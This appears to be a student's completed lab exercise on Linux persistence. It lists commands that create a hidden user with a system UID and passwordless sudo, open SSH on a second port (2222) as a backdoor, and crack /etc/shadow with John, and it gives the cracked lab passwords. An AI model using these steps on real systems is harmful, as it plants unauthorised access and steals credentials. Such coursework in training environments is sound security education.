**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    -  sudo useradd -M sysd

2. Give your secret user a password: 
    - passwd sysd 
    cybersecurity

3. Give your secret user a system UID < 1000:
    - usermod -u 600 sysd

4. Give your secret user the same GID:
   - groupmod -g 600 sysd

5. Give your secret user full `sudo` access without the need for a password:
   -  sysd ALL=(ALL) NOPASSWD:ALL

6. Test that `sudo` access works without your password: Sudo -l
apt-get update

    ```
    #!/bin/bash
    systemctl status cron
    crontab -l
    ls -l /var/spool/cron/crontabs/
    ```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    ```
    Port 22
    Port 2222
    #AddressFamily any
    #ListenAddress 0.0.0.0
    #ListenAddress ::

    ```

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - systemctl restart ssh
    ss -tulpn |grep 2222 

2. Exit the `root` account:
    - exit
    exit
    

3. SSH to the target machine using your `sysd` account and port `2222`:
    - ssh sysd@192.168.6.105 -p 2222

4. Use `sudo` to switch to the root user:
    - sudo -s

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - ssh sysd@192.168.6.105 -p 2222

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - sudo -s
    john /etc/shadow
    
    sysadmin:passw0rd
    student:Goodluck!
    mitnik:trustno1
    babbage:freedom
    lovelace:dragon
    stallman:computer
    turing:lakers


---


